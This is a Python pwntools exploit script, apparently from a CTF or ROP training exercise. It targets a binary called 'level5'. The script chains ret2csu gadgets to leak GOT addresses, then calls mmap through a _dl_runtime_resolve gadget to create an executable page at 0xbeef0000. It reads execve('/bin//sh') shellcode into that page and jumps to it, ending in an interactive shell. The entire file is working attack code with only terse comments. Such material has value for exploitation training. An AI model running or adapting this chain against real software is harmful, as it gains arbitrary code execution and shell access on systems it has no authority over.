#!/usr/bin/env python
from pwn import *

elf = ELF('level5')
libc = ELF('libc.so.6')

p = process('./level5')
#p = remote('127.0.0.1',10001)

got_write = elf.got['write']
print "got_write: " + hex(got_write)
got_read = elf.got['read']
print "got_read: " + hex(got_read)
plt_read = elf.symbols['read']
print "plt_read: " + hex(plt_read)
linker_point = 0x600ff8
print "linker_point: " + hex(linker_point)
got_pop_rax_ret = 0x0000000000023950
print "got_pop_rax_ret: " + hex(got_pop_rax_ret)

main = 0x400564

off_mmap_addr = libc.symbols['write'] - libc.symbols['mmap']
print "off_mmap_addr: " + hex(off_mmap_addr)
off_pop_rax_ret = libc.symbols['write'] - got_pop_rax_ret
print "off_pop_rax_ret: " + hex(off_pop_rax_ret)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  "\x00"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += "\x00"*56
payload1 += p64(main)

p.recvuntil("Hello, World\n")

print "\n#############sending payload1#############\n"
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8))
print "write_addr: " + hex(write_addr)
mmap_addr = write_addr - off_mmap_addr
print "mmap_addr: " + hex(mmap_addr)
pop_rax_ret = write_addr - off_pop_rax_ret
print "pop_rax_ret: " + hex(pop_rax_ret)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=linker_point, rdx=4)
payload2 =  "\x00"*136
payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(linker_point) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += "\x00"*56
payload2 += p64(main)

p.recvuntil("Hello, World\n")

print "\n#############sending payload2#############\n"
p.send(payload2)
sleep(1)

#raw_input()

linker_addr = u64(p.recv(8))
print "linker_addr + 0x35: " + hex(linker_addr + 0x35)

p.recvuntil("Hello, World\n")

shellcode = ( "\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e" +
              "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89" +
              "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" )
              
#   GADGET
#   0x7ffff7def235 <_dl_runtime_resolve+53>:	mov    r11,rax
#   0x7ffff7def238 <_dl_runtime_resolve+56>:	mov    r9,QWORD PTR [rsp+0x30]
#   0x7ffff7def23d <_dl_runtime_resolve+61>:	mov    r8,QWORD PTR [rsp+0x28]
#   0x7ffff7def242 <_dl_runtime_resolve+66>:	mov    rdi,QWORD PTR [rsp+0x20]
#   0x7ffff7def247 <_dl_runtime_resolve+71>:	mov    rsi,QWORD PTR [rsp+0x18]
#   0x7ffff7def24c <_dl_runtime_resolve+76>:	mov    rdx,QWORD PTR [rsp+0x10]
#   0x7ffff7def251 <_dl_runtime_resolve+81>:	mov    rcx,QWORD PTR [rsp+0x8]
#   0x7ffff7def256 <_dl_runtime_resolve+86>:	mov    rax,QWORD PTR [rsp]
#   0x7ffff7def25a <_dl_runtime_resolve+90>:	add    rsp,0x48
#   0x7ffff7def25e <_dl_runtime_resolve+94>:	jmp    r11

shellcode_addr = 0xbeef0000

#mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
payload3 =  "\x00"*136
payload3 += p64(pop_rax_ret) + p64(mmap_addr)
payload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)

#read(rdi=0, rsi=shellcode_addr, rdx=1024)
payload3 += p64(pop_rax_ret) + p64(plt_read)
payload3 += p64(linker_addr+0x35) + p64(0) + p64(0) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)

payload3 += p64(shellcode_addr)

print "\n#############sending payload3#############\n"
p.send(payload3)
sleep(1)

p.send(shellcode+"\n")
sleep(1)

p.interactive()

